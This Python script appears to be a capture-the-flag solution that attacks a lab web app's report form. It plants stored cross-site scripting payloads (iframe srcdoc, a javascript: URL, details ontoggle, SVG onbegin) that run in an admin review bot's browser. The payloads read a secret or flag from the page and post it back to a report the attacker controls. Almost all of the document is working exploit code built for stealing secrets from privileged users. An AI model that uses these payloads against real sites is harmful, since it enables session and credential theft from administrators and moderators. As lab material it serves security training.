# -*- coding: utf-8 -*-

import html
import re
import time
import urllib.parse
import urllib.request
import http.cookiejar


TARGET = "http://172.17.0.13:13545"
UA = {"User-Agent": "Mozilla/5.0"}

cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(cookie_jar)
)


def request(method, path, data=None):
    headers = dict(UA)
    body = None

    if data is not None:
        body = urllib.parse.urlencode(data).encode()
        headers["Content-Type"] = "application/x-www-form-urlencoded"

    req = urllib.request.Request(
        TARGET + path,
        data=body,
        headers=headers,
        method=method
    )

    with opener.open(req, timeout=15) as response:
        return response.geturl(), response.read().decode(
            "utf-8",
            "replace"
        )


def submit(reason, content):
    url, page = request(
        "POST",
        "/report",
        {
            "reason": reason,
            "content": content
        }
    )

    match = re.search(r"/report/(\d+)", url)
    if not match:
        match = re.search(r"/report/(\d+)", page)

    if not match:
        raise RuntimeError("提交举报成功，但无法获取举报单编号")

    return int(match.group(1))


def read_messages(report_id):
    _, page = request("GET", f"/report/{report_id}")

    bubbles = re.findall(
        r'<div[^>]*class=["\']?bubble[^>]*>(.*?)</div>',
        page,
        flags=re.I | re.S
    )

    return [
        html.unescape(re.sub(r"<[^>]+>", "", bubble))
        for bubble in bubbles
    ]


def build_payload(collector_id):
    js = (
        "setTimeout(function(){"
        f"var c='{collector_id}';"
        "var d=document;"
        "try{"
        "if(parent&&parent.document){d=parent.document;}"
        "}catch(e){}"
        "var value='NOT_FOUND';"
        "var node=d.querySelector('.mono,code,pre');"
        "if(node){value=node.textContent;}"
        "if(value==='NOT_FOUND'){"
        "var text=d.body?d.body.innerText:'';"
        "var match=text.match(/(?:vmc|flag)\\{[^}]+\\}/i);"
        "if(match){value=match[0];}"
        "}"
        "fetch('/report/'+c+'/reply',{"
        "method:'POST',"
        "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
        "body:'body='+encodeURIComponent('STOLEN_KEY: '+value)"
        "});"
        "},1200);"
    )

    srcdoc = html.escape(
        "<script>" + js + "</script>",
        quote=True
    )

    encoded_js = urllib.parse.quote(
        js,
        safe="()'%;,=:/?+[]{}.!-_"
    )

    return (
        f'<iframe srcdoc="{srcdoc}"></iframe>'
        f'<iframe src="javascript:{encoded_js}"></iframe>'
        f'<details open ontoggle="{js}"></details>'
        f'<svg>'
        f'<animate attributeName="x" dur="1ms" '
        f'repeatCount="1" onbegin="{js}"></animate>'
        f'</svg>'
    )


def main():
    print(f"[*] Target: {TARGET}")

    collector_id = submit(
        "1",
        "waiting for result"
    )
    print(f"[+] 收集举报单: #{collector_id}")

    payload_id = submit(
        "1",
        build_payload(collector_id)
    )
    print(f"[+] XSS 举报单: #{payload_id}")
    print("[*] 等待管理员审核机器人执行载荷...")

    for _ in range(60):
        time.sleep(2)

        for message in read_messages(collector_id):
            match = re.search(
                r"(?:vmc|flag)\{[^}]+\}",
                message,
                flags=re.I
            )

            if match:
                print(f"[+] FLAG: {match.group(0)}")
                return

    print("[-] 未收到 flag")


if __name__ == "__main__":
    main()